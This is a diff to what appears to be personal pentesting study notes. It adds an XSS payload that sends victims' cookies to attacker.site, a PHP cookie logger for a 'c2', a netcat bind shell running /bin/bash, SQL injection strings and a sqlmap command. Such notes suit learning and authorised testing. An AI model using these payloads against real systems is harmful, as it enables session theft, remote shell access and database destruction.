@@ -193,7 +193,27 @@
       Host: www.website.com
     ```
   - `POST` parameters (form data) only work in the **message body**
-   
+- XSS: stealing cookie content and sending it to an attacker
+  - XSS to insert on target: 
+    ```html
+    <script>
+    var i = new Image();
+    i.src="http://attacker.site/log.php?q="+document.cookie; 
+    </script>
+    ```
+  - PHP script to store captured data on our c2:
+    ```php
+    <?PHP
+    $filename="/tmp/log.txt"; // Where to save, this file should be already created on our c2
+    $fp=fopen($filename, 'a'); 
+    $cookie=$_GET['q']; // the parameter to store the cookies/ whatever command we need into
+    fwrite($fp, $cookie);
+    fclose($fp);
+    ?>
+    ```
+
+
+
   
 ### Helpful Commands
 - `nmap -sn 10.10.10.22/24 | grep -oP '(?<=Nmap scan report for )[^ ]*'` Clean nmap ping sweep
@@ -201,24 +221,34 @@
 - For a simple shell if target host has nc:
   - On target host: `nc -nvlp 1337 -e /bin/bash` where `-e` executes any command.
   - On our machine: `nc -v 127.0.0.1 1337` of course, instead of local host insert the target IP.
+- SQLi:
+  - `' UNION SELECT null; -- -` - Basic union injection, extra dash to avoid browsers removing trailing space. Of course keep adding nulls till we get a result.
+  - SQLMAP: `sqlmap -u 'http://vuln.site/view.php?id=203' -p id --technique=U` - Enum id parameter and use UNIONs
+  - `substring('entry', x, y)` - Used as a boolean if `' or 1=1` or alterantives are blocked where x = index/ position of char, and y = length of entry (1 per word/ entry).
+    - This is really used for predicting DB names and enumerating it by hand, insted SQL does all this work for us. 
+    - EX: User if user() = root@localhost is signed into the DB, we can check that:
+      - `SELECT substring(user(), 1, 1)` Returns `1` if root is signed in
+  - `user()` - Tells us current user logged into the DB
+  
 
 
     
 ### Good to Know
+- When testing for SQLi, don't just stop at the web UI once you find an injection, use burp to inject into: 
+  - Headers
+  - Cookies
+  - POST: Helps circumvent client-side input validation
+- SQLi can also allow us to nuke DBs where we are allowed to delete things, insert a true statement and the DB will be nuked.
+ - UNION SQLi is faster and is less prone to crashing the system. So when running SQLMap, try to select a technique instead of the leaving it empty which can possibly crash the target host
+ - A full dump can also crash the system, so dump only specific tables/ columns to be less noisy
 - Backps are typically stored in .bak, .old, .txt, and .xxx. So if we want to find any backups on a site run gobuster against those.c
 - Directory Enumeration
   - If gobuster/ dirb are being blocked, you might need a User Agent to enmulate browser traffic and snag some dirs. Ex: `dirb http://targetsite.site -a "Mozilla/ browser agent we copied from an online source"`
   - Adding a cookie can give more results with gobuster/ dirbuster. EX: `dirb http://targetsite.site -c "COOKIE:XYZ"` copy the 
   - Adding a basic auth can also bring up more results `-U` in gobuster, and in dirb: `dirb http://targetsite.site -u "admin:password"`
-  - `-x txt,php,/` to include directories with the file extensions search in gobuster.
-- XSS: stealing cookie content and sending it to an attacker
-  - ```html
-    <script>
-    var i = new Image();
-    i.src="http://attacker.site/log.php?q="+document.cookie; 
-    </script
-    ```
-    - NOTE: the log.php file is a simple scrip tthat saves files on the attacker machine
+  - `-x txt,php,/` to include directories with the file extensions search in gobuster
+
+
 
   
   
